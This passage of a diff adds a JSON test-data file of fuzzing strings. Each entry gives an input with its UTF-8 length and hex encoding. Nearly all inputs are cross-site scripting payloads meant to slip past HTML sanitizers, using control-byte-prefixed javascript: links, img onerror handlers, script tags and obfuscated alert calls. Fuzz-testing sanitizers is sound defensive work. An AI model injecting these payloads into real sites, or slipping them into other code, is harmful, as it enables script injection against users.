+    "utf8Hex": "3c6120687265663d225c7845325c7838305c7838336a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x04javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7830346a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x01javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7830316a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x08javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7830386a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\xE2\\x80\\x84javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 79,
+    "utf8Hex": "3c6120687265663d225c7845325c7838305c7838346a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\xE2\\x80\\x86javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 79,
+    "utf8Hex": "3c6120687265663d225c7845325c7838305c7838366a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\xE3\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 79,
+    "utf8Hex": "3c6120687265663d225c7845335c7838305c7838306a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x12javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7831326a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x0Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7830446a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x0Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7830416a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x0Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7830436a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x15javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7831356a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\xE2\\x80\\xA8javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 79,
+    "utf8Hex": "3c6120687265663d225c7845325c7838305c7841386a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x16javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7831366a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x02javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7830326a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x1Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7831426a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x06javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7830366a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\xE2\\x80\\xA9javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 79,
+    "utf8Hex": "3c6120687265663d225c7845325c7838305c7841396a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\xE2\\x80\\x85javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 79,
+    "utf8Hex": "3c6120687265663d225c7845325c7838305c7838356a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x1Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7831456a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\xE2\\x81\\x9Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 79,
+    "utf8Hex": "3c6120687265663d225c7845325c7838315c7839466a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x1Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7831436a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"javascript\\x00:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d226a6176617363726970745c7830303a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"javascript\\x3A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d226a6176617363726970745c7833413a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"javascript\\x09:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d226a6176617363726970745c7830393a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"javascript\\x0D:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d226a6176617363726970745c7830443a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"javascript\\x0A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d226a6176617363726970745c7830413a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "`\"'><img src=xxx:x \\x0Aonerror=javascript:alert(1)>",
+    "utf8Length": 51,
+    "utf8Hex": "6022273e3c696d67207372633d7878783a78205c7830416f6e6572726f723d6a6176617363726970743a616c6572742831293e"
+  },
+  {
+    "input": "`\"'><img src=xxx:x \\x22onerror=javascript:alert(1)>",
+    "utf8Length": 51,
+    "utf8Hex": "6022273e3c696d67207372633d7878783a78205c7832326f6e6572726f723d6a6176617363726970743a616c6572742831293e"
+  },
+  {
+    "input": "`\"'><img src=xxx:x \\x0Bonerror=javascript:alert(1)>",
+    "utf8Length": 51,
+    "utf8Hex": "6022273e3c696d67207372633d7878783a78205c7830426f6e6572726f723d6a6176617363726970743a616c6572742831293e"
+  },
+  {
+    "input": "`\"'><img src=xxx:x \\x0Donerror=javascript:alert(1)>",
+    "utf8Length": 51,
+    "utf8Hex": "6022273e3c696d67207372633d7878783a78205c7830446f6e6572726f723d6a6176617363726970743a616c6572742831293e"
+  },
+  {
+    "input": "`\"'><img src=xxx:x \\x2Fonerror=javascript:alert(1)>",
+    "utf8Length": 51,
+    "utf8Hex": "6022273e3c696d67207372633d7878783a78205c7832466f6e6572726f723d6a6176617363726970743a616c6572742831293e"
+  },
+  {
+    "input": "`\"'><img src=xxx:x \\x09onerror=javascript:alert(1)>",
+    "utf8Length": 51,
+    "utf8Hex": "6022273e3c696d67207372633d7878783a78205c7830396f6e6572726f723d6a6176617363726970743a616c6572742831293e"
+  },
+  {
+    "input": "`\"'><img src=xxx:x \\x0Conerror=javascript:alert(1)>",
+    "utf8Length": 51,
+    "utf8Hex": "6022273e3c696d67207372633d7878783a78205c7830436f6e6572726f723d6a6176617363726970743a616c6572742831293e"
+  },
+  {
+    "input": "`\"'><img src=xxx:x \\x00onerror=javascript:alert(1)>",
+    "utf8Length": 51,
+    "utf8Hex": "6022273e3c696d67207372633d7878783a78205c7830306f6e6572726f723d6a6176617363726970743a616c6572742831293e"
+  },
+  {
+    "input": "`\"'><img src=xxx:x \\x27onerror=javascript:alert(1)>",
+    "utf8Length": 51,
+    "utf8Hex": "6022273e3c696d67207372633d7878783a78205c7832376f6e6572726f723d6a6176617363726970743a616c6572742831293e"
+  },
+  {
+    "input": "`\"'><img src=xxx:x \\x20onerror=javascript:alert(1)>",
+    "utf8Length": 51,
+    "utf8Hex": "6022273e3c696d67207372633d7878783a78205c7832306f6e6572726f723d6a6176617363726970743a616c6572742831293e"
+  },
+  {
+    "input": "\"`'><script>\\x3Bjavascript:alert(1)</script>",
+    "utf8Length": 44,
+    "utf8Hex": "2260273e3c7363726970743e5c7833426a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\x0Djavascript:alert(1)</script>",
+    "utf8Length": 44,
+    "utf8Hex": "2260273e3c7363726970743e5c7830446a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xEF\\xBB\\xBFjavascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845465c7842425c7842466a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xE2\\x80\\x81javascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845325c7838305c7838316a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xE2\\x80\\x84javascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845325c7838305c7838346a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xE3\\x80\\x80javascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845335c7838305c7838306a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\x09javascript:alert(1)</script>",
+    "utf8Length": 44,
+    "utf8Hex": "2260273e3c7363726970743e5c7830396a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xE2\\x80\\x89javascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845325c7838305c7838396a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xE2\\x80\\x85javascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845325c7838305c7838356a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xE2\\x80\\x88javascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845325c7838305c7838386a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\x00javascript:alert(1)</script>",
+    "utf8Length": 44,
+    "utf8Hex": "2260273e3c7363726970743e5c7830306a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xE2\\x80\\xA8javascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845325c7838305c7841386a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xE2\\x80\\x8Ajavascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845325c7838305c7838416a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xE1\\x9A\\x80javascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845315c7839415c7838306a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\x0Cjavascript:alert(1)</script>",
+    "utf8Length": 44,
+    "utf8Hex": "2260273e3c7363726970743e5c7830436a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\x2Bjavascript:alert(1)</script>",
+    "utf8Length": 44,
+    "utf8Hex": "2260273e3c7363726970743e5c7832426a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xF0\\x90\\x96\\x9Ajavascript:alert(1)</script>",
+    "utf8Length": 56,
+    "utf8Hex": "2260273e3c7363726970743e5c7846305c7839305c7839365c7839416a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>-javascript:alert(1)</script>",
+    "utf8Length": 41,
+    "utf8Hex": "2260273e3c7363726970743e2d6a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\x0Ajavascript:alert(1)</script>",
+    "utf8Length": 44,
+    "utf8Hex": "2260273e3c7363726970743e5c7830416a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xE2\\x80\\xAFjavascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845325c7838305c7841466a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\x7Ejavascript:alert(1)</script>",
+    "utf8Length": 44,
+    "utf8Hex": "2260273e3c7363726970743e5c7837456a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xE2\\x80\\x87javascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845325c7838305c7838376a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xE2\\x81\\x9Fjavascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845325c7838315c7839466a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xE2\\x80\\xA9javascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845325c7838305c7841396a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xC2\\x85javascript:alert(1)</script>",
+    "utf8Length": 48,
+    "utf8Hex": "2260273e3c7363726970743e5c7843325c7838356a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xEF\\xBF\\xAEjavascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845465c7842465c7841456a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xE2\\x80\\x83javascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845325c7838305c7838336a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xE2\\x80\\x8Bjavascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845325c7838305c7838426a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xEF\\xBF\\xBEjavascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845465c7842465c7842456a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xE2\\x80\\x80javascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845325c7838305c7838306a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\x21javascript:alert(1)</script>",
+    "utf8Length": 44,
+    "utf8Hex": "2260273e3c7363726970743e5c7832316a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xE2\\x80\\x82javascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845325c7838305c7838326a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xE2\\x80\\x86javascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845325c7838305c7838366a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xE1\\xA0\\x8Ejavascript:alert(1)</script>",
+    "utf8Length": 52,
+    "utf8Hex": "2260273e3c7363726970743e5c7845315c7841305c7838456a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\x0Bjavascript:alert(1)</script>",
+    "utf8Length": 44,
+    "utf8Hex": "2260273e3c7363726970743e5c7830426a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\x20javascript:alert(1)</script>",
+    "utf8Length": 44,
+    "utf8Hex": "2260273e3c7363726970743e5c7832306a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "\"`'><script>\\xC2\\xA0javascript:alert(1)</script>",
+    "utf8Length": 48,
+    "utf8Hex": "2260273e3c7363726970743e5c7843325c7841306a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "<img \\x00src=x onerror=\"alert(1)\">",
+    "utf8Length": 34,
+    "utf8Hex": "3c696d67205c7830307372633d78206f6e6572726f723d22616c657274283129223e"
+  },
+  {
+    "input": "<img \\x47src=x onerror=\"javascript:alert(1)\">",
+    "utf8Length": 45,
+    "utf8Hex": "3c696d67205c7834377372633d78206f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img \\x11src=x onerror=\"javascript:alert(1)\">",
+    "utf8Length": 45,
+    "utf8Hex": "3c696d67205c7831317372633d78206f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img \\x12src=x onerror=\"javascript:alert(1)\">",
+    "utf8Length": 45,
+    "utf8Hex": "3c696d67205c7831327372633d78206f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img\\x47src=x onerror=\"javascript:alert(1)\">",
+    "utf8Length": 44,
+    "utf8Hex": "3c696d675c7834377372633d78206f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img\\x10src=x onerror=\"javascript:alert(1)\">",
+    "utf8Length": 44,
+    "utf8Hex": "3c696d675c7831307372633d78206f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img\\x13src=x onerror=\"javascript:alert(1)\">",
+    "utf8Length": 44,
+    "utf8Hex": "3c696d675c7831337372633d78206f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img\\x32src=x onerror=\"javascript:alert(1)\">",
+    "utf8Length": 44,
+    "utf8Hex": "3c696d675c7833327372633d78206f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img\\x47src=x onerror=\"javascript:alert(1)\">",
+    "utf8Length": 44,
+    "utf8Hex": "3c696d675c7834377372633d78206f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img\\x11src=x onerror=\"javascript:alert(1)\">",
+    "utf8Length": 44,
+    "utf8Hex": "3c696d675c7831317372633d78206f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img \\x47src=x onerror=\"javascript:alert(1)\">",
+    "utf8Length": 45,
+    "utf8Hex": "3c696d67205c7834377372633d78206f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img \\x34src=x onerror=\"javascript:alert(1)\">",
+    "utf8Length": 45,
+    "utf8Hex": "3c696d67205c7833347372633d78206f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img \\x39src=x onerror=\"javascript:alert(1)\">",
+    "utf8Length": 45,
+    "utf8Hex": "3c696d67205c7833397372633d78206f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img \\x00src=x onerror=\"javascript:alert(1)\">",
+    "utf8Length": 45,
+    "utf8Hex": "3c696d67205c7830307372633d78206f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img src\\x09=x onerror=\"javascript:alert(1)\">",
+    "utf8Length": 45,
+    "utf8Hex": "3c696d67207372635c7830393d78206f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img src\\x10=x onerror=\"javascript:alert(1)\">",
+    "utf8Length": 45,
+    "utf8Hex": "3c696d67207372635c7831303d78206f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img src\\x13=x onerror=\"javascript:alert(1)\">",
+    "utf8Length": 45,
+    "utf8Hex": "3c696d67207372635c7831333d78206f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img src\\x32=x onerror=\"javascript:alert(1)\">",
+    "utf8Length": 45,
+    "utf8Hex": "3c696d67207372635c7833323d78206f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img src\\x12=x onerror=\"javascript:alert(1)\">",
+    "utf8Length": 45,
+    "utf8Hex": "3c696d67207372635c7831323d78206f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img src\\x11=x onerror=\"javascript:alert(1)\">",
+    "utf8Length": 45,
+    "utf8Hex": "3c696d67207372635c7831313d78206f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img src\\x00=x onerror=\"javascript:alert(1)\">",
+    "utf8Length": 45,
+    "utf8Hex": "3c696d67207372635c7830303d78206f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img src\\x47=x onerror=\"javascript:alert(1)\">",
+    "utf8Length": 45,
+    "utf8Hex": "3c696d67207372635c7834373d78206f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img src=x\\x09onerror=\"javascript:alert(1)\">",
+    "utf8Length": 44,
+    "utf8Hex": "3c696d67207372633d785c7830396f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img src=x\\x10onerror=\"javascript:alert(1)\">",
+    "utf8Length": 44,
+    "utf8Hex": "3c696d67207372633d785c7831306f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img src=x\\x11onerror=\"javascript:alert(1)\">",
+    "utf8Length": 44,
+    "utf8Hex": "3c696d67207372633d785c7831316f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img src=x\\x12onerror=\"javascript:alert(1)\">",
+    "utf8Length": 44,
+    "utf8Hex": "3c696d67207372633d785c7831326f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img src=x\\x13onerror=\"javascript:alert(1)\">",
+    "utf8Length": 44,
+    "utf8Hex": "3c696d67207372633d785c7831336f6e6572726f723d226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img[a][b][c]src[d]=x[e]onerror=[f]\"alert(1)\">",
+    "utf8Length": 46,
+    "utf8Hex": "3c696d675b615d5b625d5b635d7372635b645d3d785b655d6f6e6572726f723d5b665d22616c657274283129223e"
+  },
+  {
+    "input": "<img src=x onerror=\\x09\"javascript:alert(1)\">",
+    "utf8Length": 45,
+    "utf8Hex": "3c696d67207372633d78206f6e6572726f723d5c783039226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img src=x onerror=\\x10\"javascript:alert(1)\">",
+    "utf8Length": 45,
+    "utf8Hex": "3c696d67207372633d78206f6e6572726f723d5c783130226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img src=x onerror=\\x11\"javascript:alert(1)\">",
+    "utf8Length": 45,
+    "utf8Hex": "3c696d67207372633d78206f6e6572726f723d5c783131226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img src=x onerror=\\x12\"javascript:alert(1)\">",
+    "utf8Length": 45,
+    "utf8Hex": "3c696d67207372633d78206f6e6572726f723d5c783132226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img src=x onerror=\\x32\"javascript:alert(1)\">",
+    "utf8Length": 45,
+    "utf8Hex": "3c696d67207372633d78206f6e6572726f723d5c783332226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<img src=x onerror=\\x00\"javascript:alert(1)\">",
+    "utf8Length": 45,
+    "utf8Hex": "3c696d67207372633d78206f6e6572726f723d5c783030226a6176617363726970743a616c657274283129223e"
+  },
+  {
+    "input": "<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>",
+    "utf8Length": 78,
+    "utf8Hex": "3c6120687265663d6a61766126233126233226233326233426233526233626233726233826233131262331327363726970743a6a6176617363726970743a616c6572742831293e5858583c2f613e"
+  },
+  {
+    "input": "<img src=\"x` `<script>javascript:alert(1)</script>\"` `>",
+    "utf8Length": 55,
+    "utf8Hex": "3c696d67207372633d22786020603c7363726970743e6a6176617363726970743a616c6572742831293c2f7363726970743e226020603e"
+  },
+  {
+    "input": "<img src onerror /\" '\"= alt=javascript:alert(1)//\">",
+    "utf8Length": 51,
+    "utf8Hex": "3c696d6720737263206f6e6572726f72202f222027223d20616c743d6a6176617363726970743a616c6572742831292f2f223e"
+  },
+  {
+    "input": "<title onpropertychange=javascript:alert(1)></title><title title=>",
+    "utf8Length": 66,
+    "utf8Hex": "3c7469746c65206f6e70726f70657274796368616e67653d6a6176617363726970743a616c6572742831293e3c2f7469746c653e3c7469746c65207469746c653d3e"
+  },
+  {
+    "input": "<a href=http://foo.bar/#x=`y></a><img alt=\"`><img src=x:x onerror=javascript:alert(1)></a>\">",
+    "utf8Length": 92,
+    "utf8Hex": "3c6120687265663d687474703a2f2f666f6f2e6261722f23783d60793e3c2f613e3c696d6720616c743d22603e3c696d67207372633d783a78206f6e6572726f723d6a6176617363726970743a616c6572742831293e3c2f613e223e"
+  },
+  {
+    "input": "<!--[if]><script>javascript:alert(1)</script -->",
+    "utf8Length": 48,
+    "utf8Hex": "3c212d2d5b69665d3e3c7363726970743e6a6176617363726970743a616c6572742831293c2f736372697074202d2d3e"
+  },
+  {
+    "input": "<!--[if<img src=x onerror=javascript:alert(1)//]> -->",
+    "utf8Length": 53,
+    "utf8Hex": "3c212d2d5b69663c696d67207372633d78206f6e6572726f723d6a6176617363726970743a616c6572742831292f2f5d3e202d2d3e"
+  },
+  {
+    "input": "<script src=\"/\\%(jscript)s\"></script>",
+    "utf8Length": 37,
+    "utf8Hex": "3c736372697074207372633d222f5c25286a7363726970742973223e3c2f7363726970743e"
+  },
+  {
+    "input": "<script src=\"\\\\%(jscript)s\"></script>",
+    "utf8Length": 37,
+    "utf8Hex": "3c736372697074207372633d225c5c25286a7363726970742973223e3c2f7363726970743e"
+  },
+  {
+    "input": "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
+    "utf8Length": 40,
+    "utf8Hex": "3c494d47202222223e3c5343524950543e616c657274282258535322293c2f5343524950543e223e"
+  },
+  {
+    "input": "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
+    "utf8Length": 57,
+    "utf8Hex": "3c494d47205352433d6a6176617363726970743a616c65727428537472696e672e66726f6d43686172436f64652838382c38332c383329293e"
+  },
+  {
+    "input": "<IMG SRC=# onmouseover=\"alert('xxs')\">",
+    "utf8Length": 38,
